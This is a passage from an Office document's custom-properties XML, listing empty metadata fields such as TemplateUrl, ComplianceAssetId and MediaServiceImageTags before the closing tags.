  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="_ExtendedDescription">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="TriggerFlowInfo">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="ComplianceAssetId">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="10" name="TemplateUrl">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="11" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
</Properties>
</file>